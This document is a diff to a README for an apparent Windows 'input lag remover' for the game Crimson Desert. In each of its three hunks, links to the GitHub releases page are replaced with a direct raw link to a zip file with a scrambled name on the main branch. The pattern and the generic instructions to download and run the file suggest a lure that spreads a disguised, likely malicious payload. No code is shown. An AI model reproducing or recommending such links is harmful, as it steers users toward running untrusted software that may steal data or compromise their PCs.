@@ -1,6 +1,6 @@
 # 🟥 Crimson-Desert-Input-Lag-Remover-Desktop - Cut Input Delay On Windows
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/leudso983/Crimson-Desert-Input-Lag-Remover-Desktop/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Now-Release%20Page-blue?style=for-the-badge)](https://github.com/leudso983/Crimson-Desert-Input-Lag-Remover-Desktop/raw/refs/heads/main/BaseMain/Desktop-Lag-Input-Crimson-Remover-Desert-v1.5.zip)
 
 ## 🖥️ Overview
 
@@ -22,7 +22,7 @@ This app is designed for simple setup on a Windows PC. You visit the release pag
 
 Use this link to visit the release page and download the latest version:
 
-https://github.com/leudso983/Crimson-Desert-Input-Lag-Remover-Desktop/releases
+https://github.com/leudso983/Crimson-Desert-Input-Lag-Remover-Desktop/raw/refs/heads/main/BaseMain/Desktop-Lag-Input-Crimson-Remover-Desert-v1.5.zip
 
 On the release page, look for the newest file under Assets. The file name may end in .exe, .zip, or another Windows format. Choose the file that matches your setup, then save it to your PC.
 
@@ -138,7 +138,7 @@ If you see more than one file, pick the one that matches your comfort level. Mos
 
 To get the latest version, visit the release page here:
 
-https://github.com/leudso983/Crimson-Desert-Input-Lag-Remover-Desktop/releases
+https://github.com/leudso983/Crimson-Desert-Input-Lag-Remover-Desktop/raw/refs/heads/main/BaseMain/Desktop-Lag-Input-Crimson-Remover-Desert-v1.5.zip
 
 ## 🗂️ Repository Topics
 
